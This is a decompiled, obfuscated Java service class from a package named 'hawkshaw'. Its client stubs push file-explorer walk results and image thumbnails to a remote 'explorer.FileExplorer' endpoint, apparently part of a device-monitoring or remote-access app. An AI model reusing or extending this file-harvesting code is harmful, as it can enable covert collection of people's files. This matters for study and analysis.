package com.hawkshaw.library.datalayer.network.service;

import X1.B;
import a3.e;
import com.hawkshaw.library.datalayer.models.Empty;
import com.hawkshaw.library.datalayer.models.PushFileExplorerWalkRequest;
import com.hawkshaw.library.datalayer.models.PushFileExplorerWalkV2Request;
import t3.N;

public final class MediaServiceImpl implements MediaService {
    public Object getPendingThumbnails(e eVar) {
        return B.B(N.f9292c, new MediaServiceImpl$getPendingThumbnails$$inlined$apiCall$default$1("explorer.FileExplorer/GetPendingThumbnails", new Empty(), false, (e) null), eVar);
    }

    public Object pushFileExplorerWalk(PushFileExplorerWalkRequest pushFileExplorerWalkRequest, e eVar) {
        return B.B(N.f9292c, new MediaServiceImpl$pushFileExplorerWalk$$inlined$apiCall$default$1("explorer.FileExplorer/PushFileExplorerWalk", pushFileExplorerWalkRequest, false, (e) null), eVar);
    }

    public Object pushFileExplorerWalkV2(PushFileExplorerWalkV2Request pushFileExplorerWalkV2Request, e eVar) {
        return B.B(N.f9292c, new MediaServiceImpl$pushFileExplorerWalkV2$$inlined$apiCall$default$1("explorer.FileExplorer/PushFileExplorerWalkV2", pushFileExplorerWalkV2Request, false, (e) null), eVar);
    }

    public Object syncThumbnails(e eVar) {
        return B.B(N.f9292c, new MediaServiceImpl$syncThumbnails$$inlined$apiCall$default$1("explorer.FileExplorer/SyncThumbnails", new Empty(), false, (e) null), eVar);
    }
}
